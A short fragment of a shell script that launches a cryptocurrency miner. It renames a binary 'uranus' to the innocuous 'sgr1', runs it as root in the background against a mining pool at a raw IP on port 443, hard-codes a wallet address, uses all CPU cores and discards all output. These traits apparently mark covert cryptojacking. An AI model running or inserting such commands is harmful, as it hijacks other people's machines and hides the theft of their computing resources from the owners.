...
mv uranus sgr1
sudo nohup ./sgr1 --donate-level 1 -o 128.199.218.20:443 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
sleep 30
